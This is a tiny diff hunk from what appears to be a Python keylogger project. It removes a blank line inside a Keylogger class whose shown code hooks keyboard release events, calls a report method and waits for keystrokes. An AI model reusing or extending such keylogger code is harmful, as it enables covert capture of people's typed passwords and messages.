@@ -98,7 +98,6 @@ class Keylogger:
         self.startDt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
-
         print(f"{datetime.now()} - Started keylogging")
         keyboard.wait()
 
